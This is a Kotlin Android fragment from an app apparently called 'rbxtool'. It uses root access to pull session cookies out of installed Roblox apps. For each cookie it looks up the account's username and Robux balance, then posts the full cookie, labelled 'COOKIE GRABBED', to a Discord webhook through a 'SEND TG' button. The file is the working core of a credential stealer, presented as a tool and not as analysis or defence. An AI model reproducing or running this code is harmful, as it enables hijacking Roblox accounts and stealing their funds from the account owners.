package com.rbxtool.app

import android.graphics.Color
import android.os.Bundle
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.widget.LinearLayout
import android.widget.TextView
import androidx.fragment.app.Fragment
import androidx.lifecycle.lifecycleScope
import com.google.android.material.button.MaterialButton
import com.google.android.material.card.MaterialCardView
import com.rbxtool.app.data.Account
import com.rbxtool.app.data.AccountStorage
import com.rbxtool.app.databinding.FragmentGrabBinding
import com.rbxtool.app.util.Constants
import com.rbxtool.app.util.CookieManager
import com.rbxtool.app.util.RobloxApi
import com.rbxtool.app.util.RootUtils
import com.rbxtool.app.util.DiscordHelper
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext

class GrabFragment : Fragment() {
    private var _b: FragmentGrabBinding? = null
    private val b get() = _b!!

    override fun onCreateView(i: LayoutInflater, c: ViewGroup?, s: Bundle?) =
        FragmentGrabBinding.inflate(i, c, false).also { _b = it }.root

    override fun onViewCreated(v: View, s: Bundle?) {
        super.onViewCreated(v, s)
        b.btnGrab.setOnClickListener { startGrab() }
    }

    private fun startGrab() {
        b.btnGrab.isEnabled = false
        b.progress.visibility = View.VISIBLE
        b.resultsContainer.removeAllViews()
        b.tvStatus.text = "Scanning..."

        lifecycleScope.launch {
            val results = withContext(Dispatchers.IO) {
                val mgr = CookieManager(requireContext())
                val pkgs = RootUtils.getRobloxPackages()
                if (pkgs.isEmpty()) return@withContext emptyList<Triple<String, String, Account?>>()
                pkgs.mapNotNull { pkg ->
                    val cookie = mgr.grabCookie(pkg) ?: return@mapNotNull null
                    val user = RobloxApi.getUser(cookie)
                    Triple(pkg, cookie, user?.let { Account(it.id, it.name, it.displayName, it.robux, cookie, pkg) })
                }
            }

            b.progress.visibility = View.GONE
            b.btnGrab.isEnabled = true

            if (results.isEmpty()) {
                b.tvStatus.text = "❌ Nggak ada Roblox instance / belum login"
                return@launch
            }

            b.tvStatus.text = "✅ Ketemu ${results.size} cookie"
            results.forEach { (pkg, cookie, account) -> addResultCard(pkg, cookie, account) }
        }
    }

    private fun addResultCard(pkg: String, cookie: String, account: Account?) {
        val ctx = requireContext()
        val card = MaterialCardView(ctx).apply {
            setCardBackgroundColor(Color.parseColor("#141414"))
            radius = 24f
            strokeColor = Color.parseColor("#252525")
            strokeWidth = 2
            val lp = LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT)
            lp.bottomMargin = 20
            layoutParams = lp
        }

        val inner = LinearLayout(ctx).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(40, 32, 40, 32)
        }

        val shortPkg = pkg.removePrefix("com.roblox.")
        val header = if (account != null)
            "👤  @${account.username}   💰  ${account.robux} Robux\n📦  $shortPkg"
        else
            "📦  $shortPkg\n⚠️  Cookie valid tapi API gagal"

        inner.addView(TextView(ctx).apply {
            text = header
            setTextColor(Color.parseColor("#F0F0F0"))
            textSize = 14f
            setLineSpacing(0f, 1.5f)
        })

        inner.addView(TextView(ctx).apply {
            text = cookie.take(55) + "..."
            setTextColor(Color.parseColor("#555555"))
            textSize = 10f
            typeface = android.graphics.Typeface.MONOSPACE
            setPadding(0, 10, 0, 16)
        })

        val btnRow = LinearLayout(ctx).apply {
            orientation = LinearLayout.HORIZONTAL
        }

        btnRow.addView(MaterialButton(ctx).apply {
            text = "SAVE"
            textSize = 11f
            letterSpacing = 0.06f
            setTextColor(Color.parseColor("#F0F0F0"))
            setBackgroundColor(Color.parseColor("#1565C0"))
            setOnClickListener {
                account?.let {
                    AccountStorage(ctx).save(it)
                    isEnabled = false
                    text = "✓ SAVED"
                }
            }
            val lp = LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f)
            lp.marginEnd = 10
            layoutParams = lp
        })

        val tgBtn = MaterialButton(ctx)
        tgBtn.text = "SEND TG"
        tgBtn.textSize = 11f
        tgBtn.letterSpacing = 0.06f
        tgBtn.setTextColor(Color.parseColor("#F0F0F0"))
        tgBtn.setBackgroundColor(Color.parseColor("#E87820"))
        tgBtn.layoutParams = LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f)
        tgBtn.setOnClickListener {
            tgBtn.isEnabled = false
            tgBtn.text = "Sending..."
            lifecycleScope.launch {
                val msg = buildDiscordMessage(account, pkg, cookie)
                val ok = withContext(Dispatchers.IO) {
                    DiscordHelper.sendMessage(Constants.DISCORD_WEBHOOK, msg)
                }
                tgBtn.text = if (ok) "✓ SENT!" else "❌ GAGAL"
            }
        }
        btnRow.addView(tgBtn)

        inner.addView(btnRow)
        card.addView(inner)
        b.resultsContainer.addView(card)
    }

    private fun buildDiscordMessage(account: Account?, pkg: String, cookie: String) = buildString {
        appendLine("🔥 **COOKIE GRABBED**")
        appendLine()
        if (account != null) {
            appendLine("👤 **Username:** ${account.username}")
            appendLine("📛 **Display:** ${account.displayName}")
            appendLine("🆔 **UserID:** ${account.id}")
            appendLine("💰 **Robux:** ${account.robux}")
            appendLine()
        }
        appendLine("📦 **App:** $pkg")
        appendLine()
        appendLine("🍪 **Cookie:**")
        append("```$cookie```")
    }

    override fun onDestroyView() { super.onDestroyView(); _b = null }
}
